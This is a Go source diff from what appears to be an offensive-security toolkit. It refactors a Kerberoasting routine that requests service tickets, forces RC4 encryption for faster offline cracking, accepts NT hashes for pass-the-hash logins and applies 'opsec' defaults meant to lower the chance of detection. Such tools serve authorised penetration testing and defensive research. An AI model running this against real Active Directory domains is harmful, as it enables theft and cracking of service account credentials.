@@ -20,11 +20,11 @@ import (
 	"strings"
 	"time"
 
-	"github.com/jcmturner/gokrb5/v8/client"
-	"github.com/jcmturner/gokrb5/v8/config"
-	"github.com/jcmturner/gokrb5/v8/iana/etypeID"
-	"github.com/jcmturner/gokrb5/v8/iana/nametype"
-	"github.com/jcmturner/gokrb5/v8/types"
+	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/client"
+	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/config"
+	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/iana/etypeID"
+	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/iana/nametype"
+	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/types"
 )
 
 // TGSResult holds the result of a TGS request for Kerberoasting
@@ -78,9 +78,11 @@ func GetTGSWithHash(username, nthash, domain, kdcHost, targetUser, spn string) (
 func GetTGSWithOptions(opts TGSOptions) (*TGSResult, error) {
 	realm := strings.ToUpper(opts.Domain)
 
-	// Create Kerberos config
+	// Create Kerberos config; ApplyKrb5OpsecDefaults stamps udp_preference_limit=1
+	// and disables OS-resolver SRV lookups — see pkg/kerberos/client.go.
 	cfg := config.New()
 	cfg.LibDefaults.DefaultRealm = realm
+	ApplyKrb5OpsecDefaults(cfg)
 	// Request RC4 (etype 23) for faster cracking - matches Impacket behavior
 	cfg.LibDefaults.DefaultTktEnctypes = []string{"rc4-hmac"}
 	cfg.LibDefaults.DefaultTktEnctypeIDs = []int32{etypeID.RC4_HMAC}
@@ -93,7 +95,7 @@ func GetTGSWithOptions(opts TGSOptions) (*TGSResult, error) {
 	cfg.Realms = []config.Realm{
 		{
 			Realm:         realm,
-			KDC:           []string{fmt.Sprintf("%s:88", opts.KDCHost)},
+			KDC:           []string{FormatKDC(opts.KDCHost, "88")},
 			DefaultDomain: strings.ToLower(opts.Domain),
 		},
 	}
@@ -110,10 +112,10 @@ func GetTGSWithOptions(opts TGSOptions) (*TGSResult, error) {
 		if err != nil {
 			return nil, fmt.Errorf("failed to create keytab from hash: %v", err)
 		}
-		cl = client.NewWithKeytab(opts.Username, realm, kt, cfg, client.DisablePAFXFAST(true))
+		cl = client.NewWithKeytab(TransportKDCDialer{}, opts.Username, realm, kt, cfg, client.DisablePAFXFAST(true))
 	} else if opts.Password != "" {
 		// Password authentication
-		cl = client.NewWithPassword(opts.Username, realm, opts.Password, cfg, client.DisablePAFXFAST(true))
+		cl = client.NewWithPassword(TransportKDCDialer{}, opts.Username, realm, opts.Password, cfg, client.DisablePAFXFAST(true))
 	} else {
 		return nil, fmt.Errorf("either password or NT hash must be provided")
 	}
